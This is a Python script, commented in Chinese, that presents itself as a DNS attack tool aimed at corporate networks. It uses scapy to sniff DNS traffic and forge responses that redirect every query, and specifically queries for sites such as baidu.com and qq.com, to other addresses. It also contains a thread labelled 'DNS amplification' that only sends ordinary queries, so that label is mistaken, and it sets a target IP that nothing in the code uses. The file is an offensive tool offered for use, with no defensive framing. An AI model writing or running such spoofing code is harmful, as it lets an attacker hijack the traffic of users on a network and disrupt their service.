#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专注DNS攻击工具
针对企业级防护网络的有效攻击方法
"""

import threading
import time
from scapy.all import *

class FocusedDNSAttack:
    def __init__(self):
        self.target_ip = "10.30.58.185"
        self.attack_running = False
        self.dns_spoof_count = 0
    
    def advanced_dns_spoofing(self):
        """高级DNS欺骗攻击"""
        print("🎯 启动高级DNS欺骗攻击")
        print("💡 将拦截所有DNS查询并重定向")
        
        def spoof_all_dns(pkt):
            if pkt.haslayer(DNSQR):
                # 获取查询的域名
                domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                
                # 创建虚假DNS响应
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                             UDP(dport=pkt[UDP].sport, sport=53)/\
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                         ttl=600, rdata="8.8.8.8"))
                
                send(spoofed_pkt, verbose=False)
                
                self.dns_spoof_count += 1
                print(f"🔧 DNS欺骗 [{self.dns_spoof_count}]: {domain} -> 8.8.8.8")
                
                # 每10个查询显示统计
                if self.dns_spoof_count % 10 == 0:
                    print(f"📊 已成功欺骗 {self.dns_spoof_count} 个DNS查询")
        
        try:
            # 监听所有DNS流量
            print("🔍 开始监听DNS流量...")
            sniff(filter="udp port 53", prn=spoof_all_dns, store=0)
        except Exception as e:
            print(f"❌ DNS欺骗失败: {e}")
    
    def targeted_dns_redirect(self):
        """针对性DNS重定向"""
        print("🎯 启动针对性DNS重定向")
        
        # 常见网站重定向规则
        redirect_rules = {
            "baidu.com": "1.1.1.1",      # 百度 -> Cloudflare
            "google.com": "8.8.4.4",     # 谷歌 -> 谷歌DNS
            "taobao.com": "208.67.222.222", # 淘宝 -> OpenDNS
            "qq.com": "8.8.8.8",        # QQ -> 谷歌DNS
            "weibo.com": "1.1.1.1",      # 微博 -> Cloudflare
        }
        
        def targeted_spoof(pkt):
            if pkt.haslayer(DNSQR):
                domain = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                
                # 检查是否在重定向规则中
                redirect_ip = None
                for rule_domain, ip in redirect_rules.items():
                    if rule_domain in domain:
                        redirect_ip = ip
                        break
                
                if redirect_ip:
                    # 创建针对性重定向
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                                 UDP(dport=pkt[UDP].sport, sport=53)/\
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                     an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', 
                                             ttl=300, rdata=redirect_ip))
                    
                    send(spoofed_pkt, verbose=False)
                    print(f"🎯 针对性重定向: {domain} -> {redirect_ip}")
        
        try:
            print("🔍 开始针对性DNS重定向...")
            sniff(filter="udp port 53", prn=targeted_spoof, store=0)
        except Exception as e:
            print(f"❌ 针对性重定向失败: {e}")
    
    def dns_amplification(self):
        """DNS放大攻击"""
        print("🎯 启动DNS放大攻击")
        
        # 发送大量DNS查询到目标
        def send_dns_queries():
            query_count = 0
            domains = ["google.com", "baidu.com", "youtube.com", "facebook.com", 
                      "twitter.com", "instagram.com", "amazon.com", "microsoft.com"]
            
            while self.attack_running and query_count < 1000:
                try:
                    # 随机选择域名
                    import random
                    domain = random.choice(domains)
                    
                    # 发送DNS查询
                    dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                    send(dns_query, verbose=False)
                    
                    query_count += 1
                    
                    if query_count % 50 == 0:
                        print(f"📊 已发送 {query_count} 个DNS查询")
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    print(f"❌ DNS查询发送失败: {e}")
                    time.sleep(1)
        
        # 启动DNS查询线程
        query_thread = threading.Thread(target=send_dns_queries)
        query_thread.daemon = True
        query_thread.start()
    
    def run_focused_attack(self):
        """运行专注DNS攻击"""
        print("=" * 70)
        print("          专注DNS攻击工具")
        print("=" * 70)
        
        print("💡 根据测试结果:")
        print("✅ DNS欺骗在企业级防护网络中有效")
        print("❌ ARP欺骗被网络防护阻止")
        print("🎯 专注DNS攻击策略...")
        
        self.attack_running = True
        
        # 创建攻击线程
        threads = []
        
        # 高级DNS欺骗
        t1 = threading.Thread(target=self.advanced_dns_spoofing)
        threads.append(t1)
        
        # 针对性DNS重定向
        t2 = threading.Thread(target=self.targeted_dns_redirect)
        threads.append(t2)
        
        # DNS放大攻击
        t3 = threading.Thread(target=self.dns_amplification)
        threads.append(t3)
        
        # 启动所有线程
        for t in threads:
            t.daemon = True
            t.start()
        
        print("\n⏰ DNS攻击运行中...")
        print("💡 按 Ctrl+C 停止攻击")
        
        try:
            # 持续运行直到手动停止
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
        
        print("\n✅ DNS攻击已停止")
        print(f"📊 总共欺骗了 {self.dns_spoof_count} 个DNS查询")
    
    def stop_attack(self):
        """停止攻击"""
        self.attack_running = False
        print("\n🛑 停止DNS攻击")

def main():
    """主函数"""
    attack = FocusedDNSAttack()
    
    try:
        attack.run_focused_attack()
    except KeyboardInterrupt:
        attack.stop_attack()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()